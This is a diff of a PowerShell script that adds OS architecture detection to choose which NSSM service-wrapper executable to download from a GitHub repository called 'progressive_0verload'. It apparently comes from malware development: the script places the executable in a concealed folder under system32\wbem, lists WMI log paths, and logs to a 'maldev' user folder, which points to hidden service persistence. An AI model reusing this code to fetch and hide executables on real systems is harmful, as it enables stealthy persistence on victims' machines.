@@ -9,14 +9,14 @@ $paths = @(
     "$env:windir\System32\LogFiles\WMI"
 )
 $curr = $MyInvocation.MyCommand.Path
-#$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
+$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
 
-$nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
-# if($arch -eq "64-bit"){
-#     $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
-# }else{
-#     $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx32.exe"
-# }
+# $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
+if($arch -eq "64-bit"){
+    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
+}else{
+    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx32.exe"
+}
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
 echo $basePath >> "C:\Users\maldev\Downloads\init_service_rootmonmon.txt"
